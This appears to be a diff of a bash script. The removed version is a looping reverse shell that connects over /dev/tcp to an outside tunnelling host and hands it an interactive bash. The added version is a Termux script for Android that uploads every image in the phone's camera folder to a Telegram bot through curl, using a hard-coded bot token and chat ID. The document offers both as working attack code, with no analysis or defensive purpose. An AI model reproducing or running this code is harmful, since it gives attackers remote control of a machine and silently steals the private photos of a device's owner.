@@ -1,31 +1,21 @@
-#!/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
 
-# Assign new IP address and port
-IP="hour-vii.gl.at.ply.gg"
-PORT="47054"
+# Telegram bot credentials
+BOT_TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
+CHAT_ID="6565158025"
+API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
 
-# Function to establish connection
-connect() {
-    exec 5<>/dev/tcp/$IP/$PORT
-    if [ $? -ne 0 ]; then
-        exit 1
+# Camera folder path
+CAMERA_DIR="/data/data/com.termux/files/home/storage/shared/DCIM/Camera"
+
+# Go to the camera directory
+cd "$CAMERA_DIR" || exit
+
+# Loop through image files
+for image in *.jpg *.jpeg *.png; do
+    if [ -f "$image" ]; then
+        curl -s -X POST "$API_URL" \
+            -F chat_id="$CHAT_ID" \
+            -F photo=@"$image"
     fi
-}
-
-# Function to start interactive shell
-start_shell() {
-    /bin/bash -i <&5 >&5 2>&5
-}
-
-# Main function
-main() {
-    while true; do
-        connect
-        start_shell
-        # Sleep for a while before attempting reconnection
-        sleep 10
-    done
-}
-
-# Start the main function
-main
+done
